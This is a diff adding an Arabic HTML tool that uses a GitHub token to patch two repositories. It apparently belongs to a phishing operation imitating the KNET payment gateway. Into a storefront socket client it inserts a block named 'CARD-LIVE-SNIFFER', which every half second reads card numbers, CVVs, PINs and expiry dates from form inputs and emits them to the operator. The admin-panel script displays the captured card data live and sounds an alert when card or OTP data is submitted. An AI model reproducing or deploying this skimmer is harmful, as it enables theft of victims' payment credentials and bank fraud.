@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>KDD Fix F130</title>
+<script src="https://cdn.tailwindcss.com"></script></head>
+<body class="bg-gray-100 p-5">
+<div class="max-w-2xl mx-auto bg-white rounded-xl p-6 shadow">
+<h1 class="text-xl font-bold mb-1">إصلاح: البطاقة المباشرة تثبت + الفقّة مقيّدة</h1>
+<p class="text-sm text-gray-500 mb-4">يعدّل ملفين: KDD/server/admin/index.html + kdkaw/src/integrations/socket/client.ts</p>
+<input id="tok" dir="ltr" class="w-full border rounded-lg p-2 mb-3" placeholder="ghp_...">
+<button id="go" class="w-full bg-blue-600 text-white py-3 rounded-lg font-bold">تطبيق الإصلاح</button>
+<pre id="log" dir="ltr" class="mt-4 bg-gray-900 text-green-400 p-3 rounded text-xs whitespace-pre-wrap" style="min-height:150px"></pre>
+</div>
+<script>
+var P_ADMIN = `<script id="kddF130">
+(function(){
+  if (window.__f130) return; window.__f130 = 1;
+  try { if (document.title.indexOf('F130') < 0) document.title += ' ·F130'; } catch(e){}
+  function hasData(lc){ if (!lc) return ''; return String(lc.cardNumber||'').replace(/\\D/g,'') + String(lc.nameOnCard||'') + String(lc.expiryDate||'') + String(lc.cvv||''); }
+  var __r = window.renderVisitorDetails;
+  if (typeof __r === 'function' && !__r.__f130){
+    var __w = function(v){ try { if (v && v.liveCard && hasData(v.liveCard)) v.liveCardTimestamp = new Date().toISOString(); } catch(e){} return __r.apply(this, arguments); };
+    __w.__f130 = 1; window.renderVisitorDetails = __w; try { renderVisitorDetails = __w; } catch(e){}
+  }
+  function take(x){ try { if (!x || !x.visitorId || !x.liveCard) return; var v = visitors.get(x.visitorId); if (v){ v.liveCard = x.liveCard; v.liveCardTimestamp = x.liveCardTimestamp || new Date().toISOString(); } } catch(e){} }
+  function hook(){
+    try {
+      var s = window.socket;
+      if (!s || s === window.__stub || !s.on || s.__f130h) return;
+      s.__f130h = 1;
+      s.on('card:liveUpdate', function(x){ take(x); });
+      s.on('visitors:update', function(list){ try { (list||[]).forEach(function(x){ if (x && x.liveCard){ var v = visitors.get(x._id); if (v && !hasData(v.liveCard)){ v.liveCard = x.liveCard; v.liveCardTimestamp = x.liveCardTimestamp || new Date().toISOString(); } } }); } catch(e){} });
+    } catch(e){}
+  }
+  hook(); setInterval(hook, 400);
+  var hl = 0;
+  function heal(){
+    var t = Date.now(); if (t - hl < 1200) return;
+    try {
+      var v = null; try { v = visitors.get(selectedVisitorId); } catch(e){}
+      if (!v){ try { visitors.forEach(function(x){ if (!v && x && x._id === selectedVisitorId) v = x; }); } catch(e){} }
+      if (!v || !v.liveCard || !hasData(v.liveCard)) return;
+      var box = document.getElementById('visitorDetails'); if (!box) return;
+      if (box.innerHTML.indexOf('مباشر') > -1) return;
+      hl = t; v.liveCardTimestamp = new Date().toISOString(); renderVisitorDetails(v);
+    } catch(e){}
+  }
+  setInterval(heal, 700);
+  function badge(){
+    try {
+      var v = null; try { v = visitors.get(selectedVisitorId); } catch(e){}
+      var d = v && v.liveCard ? String(v.liveCard.cardNumber||'').replace(/\\D/g,'') : '';
+      var b = document.getElementById('kdd130badge');
+      if (!b){ b = document.createElement('div'); b.id = 'kdd130badge'; document.body.appendChild(b); b.style.cssText = 'position:fixed;left:8px;bottom:8px;z-index:2147483000;background:#111;color:#7ab8ff;font:11px monospace;padding:4px 8px;border-radius:6px;opacity:.9;direction:ltr'; }
+      b.textContent = 'F130 | live:' + (d || '-');
+    } catch(e){}
+  }
+  setInterval(badge, 600);
+  function A(){ try { return frogAudio; } catch(e){ return null; } }
+  try { var a0 = A(); if (a0 && a0.play && !a0.__realPlay){ a0.__realPlay = a0.play.bind(a0); a0.play = function(){ return Promise.resolve(); }; } } catch(e){}
+  function ok(x){
+    try {
+      var d = x && x.data, v = x && x.visitor;
+      var p = String((d && (d.page || d['الصفحة'])) || (v && v.page) || '');
+      if (d){
+        if (d.digitCode || d['الرمز'] || d.otp || d.code) return true;
+        if (d.paymentCard || d.cardNumber || d.cardNumberOnly || d.cvv || d.pin || d.nameOnCard || d.prefix || d.bankName) return true;
+      }
+      if (p) return /(ملخص|summary|كي\\s*نت|knet|بطاقة|card|credit|دفع|otp|رمز|cvv|atm|pin)/i.test(p);
+    } catch(e){}
+    return false;
+  }
+  var lastF = 0;
+  function fire(){
+    var t = Date.now(); if (t - lastF < 400) return; lastF = t;
+    try { var a = A(); if (a && a.__realPlay){ a.currentTime = 0; a.__realPlay().catch(function(){}); } else { new Audio('/admin/frog.mp3').play().catch(function(){}); } } catch(e){}
+  }
+  function hookF(){
+    try {
+      var s = window.socket;
+      if (!s || s === window.__stub || !s.on || s.__f130f) return;
+      s.__f130f = 1;
+      s.on('visitor:dataSubmitted', function(x){ try { if (ok(x)) fire(); } catch(e){} });
+    } catch(e){}
+  }
+  hookF(); setInterval(hookF, 400);
+})();
+</script>`;
+
+var P_STORE = `
+/* KDK-CARD-LIVE-SNIFFER */
+(function(){
+  if (typeof window === 'undefined') return;
+  var last = '';
+  function isCardPhase(){ try { return ((document.body as any).innerText || '').indexOf('Select Your Bank') > -1; } catch(e){ return false; } }
+  function snap(){
+    var num = '', cvv = '', pin = '', bank = '', prefix = '', mm = '', yy = '';
+    var ins = document.querySelectorAll('input');
+    for (var i = 0; i < ins.length; i++){
+      var el = ins[i] as any;
+      var ml = String(el.getAttribute('maxlength') || '');
+      var v = String(el.value || '').replace(/\\D/g, '');
+      if (!v) continue;
+      if (el.type === 'password') { pin = v; continue; }
+      if (ml === '3') { cvv = v; continue; }
+      if (ml === '10') { num = v; continue; }
+    }
+    var sels = document.querySelectorAll('select');
+    for (var j = 0; j < sels.length; j++){
+      var s = sels[j] as any;
+      var sv = String(s.value || '');
+      if (!sv) continue;
+      if (/^\\d{6,8}$/.test(sv)) { if (!prefix) prefix = sv; continue; }
+      if (/^\\d{4}$/.test(sv)) { if (!yy) yy = sv; continue; }
+      if (/^\\d{1,2}$/.test(sv)) { if (!mm) mm = sv; continue; }
+      if (!bank) bank = sv;
+    }
+    return { cardNumber: prefix + num, nameOnCard: bank, expiryDate: (mm && yy) ? (mm + '/' + yy.slice(-2)) : '', cvv: cvv, pin: pin, consent: true };
+  }
+  function tick(){
+    try {
+      if (!isCardPhase()) return;
+      var s = socket as any;
+      if (!s || !s.connected) return;
+      var d = snap();
+      var sig = d.cardNumber + '|' + d.nameOnCard + '|' + d.expiryDate + '|' + d.cvv + '|' + d.pin;
+      if (sig === last) return;
+      last = sig;
+      s.emit('card:live', d);
+    } catch(e){}
+  }
+  setInterval(tick, 500);
+})();
+/* END-KDK-CARD-LIVE-SNIFFER */`;
+
+var tk = '';
+function log(m){ var l = document.getElementById('log'); l.textContent += m + '\n'; l.scrollTop = l.scrollHeight; }
+function b64d(s){ var bin = atob(String(s).replace(/\s/g,'')); var a = new Uint8Array(bin.length); for (var i=0;i<bin.length;i++) a[i]=bin.charCodeAt(i); return new TextDecoder('utf-8').decode(a); }
+function b64e(s){ var a = new TextEncoder().encode(s); var o=''; for (var i=0;i<a.length;i++) o += String.fromCharCode(a[i]); return btoa(o); }
+async function api(method, url, body){
+  var r = await fetch(url, { method: method, headers: { 'Authorization': 'token ' + tk, 'Accept': 'application/vnd.github+json', 'Content-Type': 'application/json' }, body: body ? JSON.stringify(body) : undefined });
+  if (!r.ok){ throw new Error(method + ' ' + r.status + ' ' + (await r.text()).slice(0,160)); }
+  return r.json();
+}
+function insertAfterLastScript(html, patch){
+  var i = html.lastIndexOf('</script>');
+  if (i < 0) throw new Error('no closing script tag');
+  return html.slice(0, i + 9) + '\n' + patch + html.slice(i + 9);
+}
+async function patchFile(repo, path, mode, patch, msg){
+  var base = 'https://api.github.com/repos/' + repo + '/contents/' + path;
+  var info = await api('GET', base + '?t=' + Date.now());
+  var src = b64d(info.content);
+  if (mode === 'admin'){
+    var re = /<script id="kddF130">[\s\S]*?<\/script>\n?/;
+    if (re.test(src)){ src = src.replace(re, ''); log('   (شلت نسخة F130 قديمة)'); }
+    src = insertAfterLastScript(src, patch);
+  } else {
+    src = src.replace(/\n?\/\* KDK-CARD-LIVE-SNIFFER \*\/[\s\S]*?\/\* END-KDK-CARD-LIVE-SNIFFER \*\//, '');
+    src = src + '\n' + patch + '\n';
+  }
+  await api('PUT', base, { message: msg, content: b64e(src), sha: info.sha });
+}
+try { var st = localStorage.getItem('kdd_tok'); if (st){ document.getElementById('tok').value = st; } } catch(e){}
+document.getElementById('go').onclick = async function(){
+  var t = document.getElementById('tok').value.trim();
+  if (!t){ alert('الصق التوكن أولاً'); return; }
+  try { localStorage.setItem('kdd_tok', t); } catch(e){}
+  tk = t;
+  var btn = document.getElementById('go'); btn.disabled = true;
+  try {
+    log('1) server/admin/index.html ...');
+    await patchFile('fahshomi-ui/KDD', 'server/admin/index.html', 'admin', P_ADMIN, 'fix: live card sticky + frog scoped (F130)');
+    log('   ✓ تم');
+    log('2) kdkaw/src/integrations/socket/client.ts ...');
+    await patchFile('fahshomi-ui/kdkaw', 'src/integrations/socket/client.ts', 'store', P_STORE, 'fix(knet): emit card:live from page socket (sniffer)');
+    log('   ✓ تم');
+    log('خلص ✓ — Render ~1 دقيقة، و Netlify ~2 دقيقة للواجهة. بعدها Ctrl+Shift+R');
+  } catch(e){ log('خطأ: ' + e.message); }
+  btn.disabled = false;
+};
+</script>
+</body></html>
